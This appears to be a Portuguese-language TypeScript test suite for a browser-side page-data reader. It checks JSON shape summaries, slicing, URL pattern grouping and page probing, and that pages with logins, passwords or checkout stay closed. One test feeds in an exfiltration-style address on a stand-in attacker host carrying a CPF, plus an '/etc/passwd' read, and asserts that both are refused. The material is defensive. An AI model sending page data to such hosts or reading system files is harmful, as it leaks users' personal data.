import { afterAll, beforeAll, describe, expect, it } from 'bun:test';
import { JSDOM } from 'jsdom';
import { type Bruto, coletarBastidor, formatoJson, lerFonteNaPagina, montarSondagem, padroesDeUrl, recortarJson } from '../utils/bastidor';

const bruto = (b: Partial<Bruto>): Bruto => ({
  url: 'https://loja.com/notas',
  temSenha: false,
  embutidos: [],
  rede: [],
  links: [],
  sitemap: '',
  robots: '',
  exportar: [],
  ...b,
});

describe('formatoJson: o formato sem os valores', () => {
  it('mostra chaves, tipos e o tamanho das listas, sem vazar o conteúdo', () => {
    const f = formatoJson({ total: 2, itens: [{ id: 1, cliente: 'Padaria Sol', pago: true }], meta: null });
    expect(f).toBe('total: número\nitens: lista[1] de:\n  id: número\n  cliente: texto\n  pago: boolean\nmeta: nulo');
    expect(f).not.toContain('Padaria');
    expect(formatoJson([1, 2, 3])).toBe('lista[3]');
  });
});

describe('recortarJson: só o pedaço pedido, cabendo no limite', () => {
  const dados = {
    dados: { itens: Array.from({ length: 50 }, (_, i) => ({ id: i, nome: `Cliente ${i}`, obs: i === 7 ? 'São   Paulo' : null })) },
  };

  it('caminho com ponto e com índice chega a um valor', () => {
    expect(recortarJson(dados, { caminho: 'dados.itens[3].nome' })).toEqual({ texto: '"Cliente 3"', truncado: false });
  });

  it('lista de registros vira tabela: cabeçalho uma vez, uma linha por item', () => {
    const r = recortarJson(dados, { caminho: 'dados.itens' }) as { texto: string; truncado: boolean };
    const linhas = r.texto.split('\n');
    expect(linhas[0]).toBe('50 itens. Colunas: id | nome | obs');
    expect(linhas[1]).toBe('0 | Cliente 0 | ');
    expect(linhas).toHaveLength(51);
    expect(r.truncado).toBe(false);
  });

  it('filtro deixa só os itens que contêm o texto, sem ligar para acento', () => {
    const r = recortarJson(dados, { caminho: 'dados.itens', filtro: 'sao paulo' }) as { texto: string };
    expect(r.texto).toBe('1 de 50 itens contêm "sao paulo". Colunas: id | nome | obs\n7 | Cliente 7 | São Paulo');
  });

  it('lista que não cabe: linhas inteiras, quantas faltam e como continuar; `desde` continua', () => {
    const r = recortarJson(dados, { caminho: 'dados.itens', limite: 200 }) as { texto: string; truncado: boolean };
    expect(r.truncado).toBe(true);
    const falta = /faltam (\d+): chame de novo com desde=(\d+)/.exec(r.texto)!;
    expect(Number(falta[1]) + Number(falta[2])).toBe(50);
    const resto = recortarJson(dados, { caminho: 'dados.itens', desde: 48 }) as { texto: string };
    expect(resto.texto).toBe('50 itens, a partir do 48º. Colunas: id | nome | obs\n48 | Cliente 48 | \n49 | Cliente 49 | ');
  });

  it('lista de coisas diferentes fica em JSON; caminho que não existe devolve o formato; objeto grande é cortado', () => {
    expect((recortarJson([1, { a: [2] }]) as { texto: string }).texto).toBe('2 itens\n1\n{"a":[2]}');
    expect((recortarJson(dados, { caminho: 'dados.nada' }) as { erro: string }).erro).toContain('itens: lista[50]');
    const grande = recortarJson({ texto: 'x'.repeat(500) }, { limite: 100 }) as { texto: string; truncado: boolean };
    expect(grande.truncado).toBe(true);
    expect(grande.texto).toContain('texto: texto');
  });
});

describe('padroesDeUrl: por onde dá para ir direto', () => {
  it('agrupa por formato, só do mesmo site, e ignora link sem padrão', () => {
    const p = padroesDeUrl(
      [
        'https://loja.com/notas/1041',
        'https://loja.com/notas/1042',
        'https://loja.com/busca?q=sol&pagina=2',
        'https://loja.com/sobre',
        'https://outro.com/x/1',
        'não é url',
      ],
      'https://loja.com/notas',
    );
    expect(p).toEqual([
      { padrao: '/notas/{n}', quantos: 2, exemplo: 'https://loja.com/notas/1041' },
      { padrao: '/busca?pagina=&q=', quantos: 1, exemplo: 'https://loja.com/busca?q=sol&pagina=2' },
    ]);
  });
});

describe('montarSondagem', () => {
  it('lista cada porta com a fonte que o ler_dados aceita', () => {
    const t = montarSondagem(
      bruto({
        embutidos: [
          { nome: '__NEXT_DATA__', texto: '{"props":{"notas":[{"id":1}]}}' },
          { nome: 'application/json', texto: 'não é json' },
        ],
        rede: ['https://loja.com/api/notas?mes=9'],
        links: ['https://loja.com/notas/1', 'https://loja.com/notas/2'],
        sitemap: '<urlset><url><loc>https://loja.com/a</loc></url><url><loc> https://loja.com/b </loc></url></urlset>',
        exportar: ['Exportar CSV'],
      }),
    );
    expect(t).toContain('fonte "embutido:0" (__NEXT_DATA__');
    expect(t).not.toContain('embutido:1'); // o que não é JSON não é oferecido
    expect(t).toContain('fonte "rede:https://loja.com/api/notas?mes=9"');
    expect(t).toContain('/notas/{n}  (2 links');
    expect(t).toContain('sitemap.xml, 2 endereços');
    expect(t).toContain('"Exportar CSV"');
  });

  it('página de login, de pagamento ou com senha: bastidor fechado; página sem nada diz isso', () => {
    expect(montarSondagem(bruto({ temSenha: true, rede: ['https://loja.com/api'] }))).toContain('bastidor fica fechado');
    expect(montarSondagem(bruto({ url: 'https://checkout.loja.com/pagar', rede: ['https://x/api'] }))).toContain('bastidor fica fechado');
    expect(montarSondagem(bruto({}))).toContain('Nenhuma porta de bastidor');
  });
});

describe('dentro da página: coleta e leitura', () => {
  const GLOBAIS = ['window', 'document', 'location', 'performance', 'fetch'];
  let pedidos: { url: string; metodo?: string; credenciais?: string }[] = [];
  const originais: Record<string, unknown> = {};

  beforeAll(() => {
    const dom = new JSDOM(
      `<!doctype html><body><script type="application/json" id="dados">{"a":1}</script>
       <a href="/notas/7">nota</a><button>Exportar CSV</button><button>Salvar</button></body>`,
      { url: 'https://loja.com/notas' },
    );
    const g = globalThis as Record<string, unknown>;
    for (const k of GLOBAIS) originais[k] = g[k]; // `performance` e `fetch` são do runtime: voltam depois
    g.window = dom.window;
    g.document = dom.window.document;
    g.location = dom.window.location;
    g.performance = {
      getEntriesByType: () => [
        { initiatorType: 'fetch', name: 'https://loja.com/api/notas' },
        { initiatorType: 'img', name: 'https://loja.com/logo.png' },
      ],
    };
    g.fetch = async (url: string | URL, init?: RequestInit) => {
      pedidos.push({ url: String(url), metodo: init?.method, credenciais: init?.credentials });
      return String(url).endsWith('/api/notas') ? new Response('{"itens":[1,2]}') : new Response('', { status: 404 });
    };
  });
  afterAll(() => {
    for (const k of GLOBAIS) {
      if (originais[k] === undefined) delete (globalThis as Record<string, unknown>)[k];
      else (globalThis as Record<string, unknown>)[k] = originais[k];
    }
  });

  it('coleta: JSON embutido, só o que a página buscou por código, links e botões de exportar', async () => {
    const b = await coletarBastidor(1000);
    expect(b.embutidos).toEqual([{ nome: 'dados', texto: '{"a":1}' }]);
    expect(b.rede).toEqual(['https://loja.com/api/notas']);
    expect(b.links).toEqual(['https://loja.com/notas/7']);
    expect(b.exportar).toEqual(['Exportar CSV']);
    expect(b.temSenha).toBe(false);
    // sitemap e robots são públicos: vão sem cookie
    expect(pedidos.every((p) => p.credenciais === 'omit')).toBe(true);
  });

  it('ler embutido não faz requisição; ler rede só relê por GET o que a página já buscou', async () => {
    pedidos = [];
    expect(await lerFonteNaPagina('embutido:0', 1000, 1000)).toEqual({ texto: '{"a":1}' });
    expect(pedidos).toHaveLength(0);
    expect(await lerFonteNaPagina('rede:https://loja.com/api/notas', 1000, 1000)).toEqual({ texto: '{"itens":[1,2]}' });
    expect(pedidos).toEqual([{ url: 'https://loja.com/api/notas', metodo: 'GET', credenciais: 'include' }]);
  });

  it('endereço que a página não buscou é recusado sem requisição (bastidor não é canal de saída)', async () => {
    pedidos = [];
    const r = await lerFonteNaPagina('rede:https://atacante.com/coleta?cpf=123', 1000, 1000);
    expect(r.erro).toContain('só relê o que a própria página já pediu');
    expect((await lerFonteNaPagina('embutido:9', 1, 1)).erro).toContain('não existe');
    expect((await lerFonteNaPagina('arquivo:/etc/passwd', 1, 1)).erro).toContain('fonte desconhecida');
    expect(pedidos).toHaveLength(0);
  });
});
